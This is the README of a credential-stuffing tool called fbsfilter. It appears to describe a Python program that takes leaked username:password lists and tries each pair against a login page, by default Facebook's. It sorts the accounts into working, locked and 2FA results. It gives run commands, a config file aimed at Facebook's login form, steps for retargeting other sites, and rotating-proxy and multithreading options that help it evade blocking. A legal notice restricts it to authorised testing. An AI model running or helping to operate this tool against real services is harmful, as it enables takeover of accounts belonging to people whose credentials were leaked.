# fbsfilter

**fbsfilter** is a credential-filter tool for Windows (and Linux/macOS).  
It loads a list of leaked credentials (`username:password`), checks which accounts are still active by attempting a login to a configurable target, and writes sorted results to separate output files.

> ⚠️ **Legal Notice** – This tool is intended solely for security research, penetration testing, and account recovery on systems you own or have explicit written permission to test. Unauthorised credential stuffing or account access is illegal in most jurisdictions. The authors assume no liability for misuse.

---

## Features

| Feature | Details |
|---|---|
| **Load leaked data** | Streams large files (millions of lines) without loading everything into RAM |
| **Configurable target** | Login URL, field names, and success criteria via `config.ini` |
| **Result categories** | `working.txt`, `invalid.txt`, `locked.txt`, `2fa.txt` |
| **Multi-threading** | Configurable number of worker threads for high throughput |
| **Proxy support** | HTTP / HTTPS / SOCKS5 with automatic rotation and bad-proxy removal |
| **No-proxy mode** | Direct connection with a single flag |
| **Progress bar** | Live stats via `tqdm` (processed, working, invalid, locked, 2FA, errors) |
| **Checkpoint / resume** | Saves progress periodically; resumes automatically if interrupted |
| **Logging** | All events timestamped to `fbsfilter.log` |

---

## Project Structure

```
fbsfilter/
├── fbsfilter.py          # Main entry point
├── config.ini            # Configuration (target URL, threads, proxy settings …)
├── requirements.txt      # Python dependencies
├── utils/
│   ├── __init__.py
│   ├── checker.py        # HTTP login attempt + result classification
│   ├── file_handler.py   # Streaming file I/O + result writers
│   └── proxy_manager.py  # Proxy pool with rotation
└── README.md
```

---

## Quick Start

### 1. Install dependencies

```bash
pip install -r requirements.txt
```

### 2. Prepare input files

**`leaks.txt`** – one credential per line:
```
user@example.com:hunter2
john.doe@mail.com:P@ssw0rd
```

**`proxies.txt`** *(optional)* – one proxy per line:
```
socks5://user:pass@1.2.3.4:1080
http://5.6.7.8:8080
https://9.10.11.12:3128
```

### 3. Run

```bash
# No proxy, 20 threads
python fbsfilter.py -i leaks.txt -t 20

# With proxy file, 50 threads
python fbsfilter.py -i leaks.txt -p proxies.txt -t 50

# Custom config for another site
python fbsfilter.py -c my_config.ini -i emails.txt

# Force no-proxy even if config enables proxies
python fbsfilter.py -i leaks.txt --no-proxy

# Skip first 5000 lines (manual resume)
python fbsfilter.py -i leaks.txt --skip 5000
```

---

## Configuration (`config.ini`)

```ini
[Target]
url                      = https://www.facebook.com/login.php
username_field           = email
password_field           = pass
extra_fields             = {"login": "1", "next": ""}
method                   = POST
success_redirect_contains = facebook.com
failure_keyword          = incorrect password

[General]
threads         = 10
timeout         = 10
retries         = 2
delay           = 0.5
delimiter       = :
checkpoint_every = 500

[Proxy]
enabled      = false
proxy_file   = proxies.txt
rotate_every = 1
test_proxies = false

[Output]
working_file = working.txt
invalid_file = invalid.txt
locked_file  = locked.txt
twofa_file   = 2fa.txt
log_file     = fbsfilter.log
```

### Adapting for another site

1. Change `url` to the login endpoint.
2. Change `username_field` / `password_field` to match the HTML form field names.
3. Set `success_redirect_contains` to a URL fragment that only appears after a successful login.
4. Set `failure_keyword` to text that appears on the login page when the password is wrong.
5. Add any extra hidden form fields under `extra_fields` as a JSON object.

---

## Command-Line Reference

```
usage: fbsfilter [-h] -i FILE [-c FILE] [-p FILE] [-t N] [-d CHAR]
                 [--no-proxy] [--url URL] [--skip N] [-v]

  -i, --input FILE     Input credentials file (required)
  -c, --config FILE    Path to config.ini  (default: config.ini)
  -p, --proxies FILE   Proxy list file     (enables proxy mode)
  -t, --threads N      Worker thread count (overrides config)
  -d, --delimiter CHAR Credential delimiter (overrides config)
  --no-proxy           Disable proxies unconditionally
  --url URL            Override login URL from config
  --skip N             Skip the first N credentials
  -v, --verbose        Enable debug logging to console
```

---

## Output Files

| File | Contents |
|---|---|
| `working.txt` | Credentials where login succeeded |
| `invalid.txt` | Wrong password or account not found |
| `locked.txt` | Account / IP blocked, CAPTCHA triggered |
| `2fa.txt` | Valid credentials but 2-factor auth required |
| `fbsfilter.log` | Full timestamped log |

Each line is in `username:password  # detail` format.

---

## Building a Standalone Windows `.exe`

```bash
pip install pyinstaller
pyinstaller --onefile --name fbsfilter fbsfilter.py
```

The executable will be in `dist/fbsfilter.exe`.

---

## Dependencies

| Package | Purpose |
|---|---|
| `requests` | HTTP requests |
| `requests[socks]` | SOCKS5 proxy support |
| `colorama` | Coloured console output on Windows |
| `tqdm` | Progress bars |
| `urllib3` | SSL warning suppression |

